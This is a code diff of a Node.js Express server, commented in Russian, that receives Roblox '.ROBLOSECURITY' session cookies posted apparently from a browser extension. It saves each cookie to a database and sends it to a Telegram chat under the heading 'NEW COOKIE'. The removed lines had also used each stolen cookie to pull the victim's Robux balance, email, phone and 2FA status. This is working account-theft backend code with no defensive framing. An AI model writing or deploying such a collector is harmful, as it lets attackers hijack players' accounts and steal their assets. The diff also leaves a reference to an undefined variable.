@@ -11,95 +11,23 @@ const bot = new Bot(process.env.BOT_TOKEN);
 
 sendTelegramMessage = async (chatId, message) => {
   try {
-    await bot.api.sendMessage(chatId, message);
-    console.log("Сообщение отправлено!");
+    await bot.api.sendMessage(chatId, message, {
+      parse_mode : "HTML",
+    });
   } catch (error) {
     console.error("Ошибка отправки:", error);
   }
 };
-async function getRobloxAccountDetails(cookieValue) {
-  const headers = {
-    Cookie: `.ROBLOSECURITY=${cookieValue}`,
-    Accept: "application/json",
-  };
 
-  const fetchJson = async (url) => {
-    const res = await fetch(url, { method: "GET", headers });
-    if (!res.ok) {
-      throw new Error(`${url} -> HTTP ${res.status}`);
-    }
-    return res.json();
-  };
-
-  // 1. Базовый профиль: id, name, displayName
-  const authUser = await fetchJson(
-    "https://users.roblox.com/v1/users/authenticated",
-  );
-  const userId = authUser.id;
-
-  // 2. Параллельно запрашиваем остальные данные
-  const [
-    userProfileRes,
-    robuxRes,
-    emailRes,
-    phoneRes,
-    twoStepRes,
-    pinRes,
-    premiumRes,
-  ] = await Promise.allSettled([
-    fetchJson(`https://users.roblox.com/v1/users/${userId}`), // created (дата создания)
-    fetchJson(`https://economy.roblox.com/v1/users/${userId}/currency`), // robux
-    fetchJson("https://accountsettings.roblox.com/v1/email"), // emailVerified / emailAddress
-    fetchJson("https://accountinformation.roblox.com/v1/phone"), // isVerified / phone
-    fetchJson(
-      `https://twostepverification.roblox.com/v1/users/${userId}/configuration`,
-    ), // enabled
-    fetchJson("https://auth.roblox.com/v1/account/pin"), // isEnabled (статус PIN)
-    fetchJson(
-      `https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`,
-    ), // boolean
-  ]);
-
-  const val = (res, fallback = null) =>
-    res.status === "fulfilled" ? res.value : fallback;
-
-  const profile = val(userProfileRes, {});
-  const robux = val(robuxRes, {});
-  const email = val(emailRes, {});
-  const phone = val(phoneRes, {});
-  const twoStep = val(twoStepRes, {});
-  const pin = val(pinRes, {});
-  const premium = val(premiumRes, false);
-
-  return {
-    id: userId,
-    name: authUser.name,
-    displayName: authUser.displayName,
-    createdAt: profile.created ?? null,
-    robux: robux.robux ?? null,
-    isPremium:
-      typeof premium === "boolean" ? premium : Boolean(premium?.isPremium),
-    email: {
-      verified: email.verified ?? email.emailVerified ?? null,
-      address: email.emailAddress ?? null,
-    },
-    phone: {
-      verified: phone.isVerified ?? phone.verified ?? null,
-      number: phone.phone ?? null,
-    },
-    twoFactorEnabled: twoStep.enabled ?? twoStep.isEnabled ?? null,
-    pinEnabled: pin.isEnabled ?? pin.enabled ?? null,
-  };
-}
 
 app.use(express.json());
 app.use(
   cors({
-    origin: "chrome-extension://eboadfllildekgjmpbdcgbhdmacehndf",
     methods: ["POST", "OPTIONS"],
     allowedHeaders: ["Content-Type"],
   }),
 );
+
 app.post("/save", async (req, res) => {
   const { login } = req.body ?? {};
   if (!login) {
@@ -109,50 +37,12 @@ app.post("/save", async (req, res) => {
   }
 
   try {
-    const account = await getRobloxAccountDetails(login);
-
-    // Пример: сохраняем в БД (подставьте нужные колонки вашей таблицы)
     await client`
-      INSERT INTO users (
-        roblox_id,
-        username,
-        display_name,
-        created_at,
-        robux,
-        is_premium,
-        email_verified,
-        phone_verified,
-        two_fa_enabled,
-        pin_enabled,
-        login
-      )
-      VALUES (
-        ${account.id},
-        ${account.name},
-        ${account.displayName},
-        ${account.createdAt},
-        ${account.robux},
-        ${account.isPremium},
-        ${account.email.verified},
-        ${account.phone.verified},
-        ${account.twoFactorEnabled},
-        ${account.pinEnabled},
-        ${login}
-      )
-    `;
+      INSERT INTO users (cookie)
+      VALUES (${login})`;
 
     await sendTelegramMessage(
-      process.env.CHAT_ID,
-      [
-        `<b>Аккаунт:</b> ${account.displayName} (@${account.name}, ID: <code>${account.id}</code>)`,
-        `<b>Создан:</b> ${account.createdAt ?? "н/д"}`,
-        `<b>Robux:</b> ${account.robux ?? "н/д"} | <b>Premium:</b> ${account.isPremium ? "да" : "нет"}`,
-        `<b>Почта:</b> ${account.email?.verified ?? "н/д"} | <b>Телефон:</b> ${account.phone?.verified ?? "н/д"}`,
-        `<b>2FA:</b> ${account.twoFactorEnabled ?? "н/д"} | <b>PIN:</b> ${account.pinEnabled ?? "н/д"}`,
-        ``,
-        `<b>COOKIE:</b> <code>${login}</code>`,
-      ].join("\n"),
-    );
+      process.env.CHAT_ID, `<b>NEW COOKIE 🍪</b> -----  <code>${login}</code> `);
 
     res.json({ ok: true, account });
   } catch (err) {
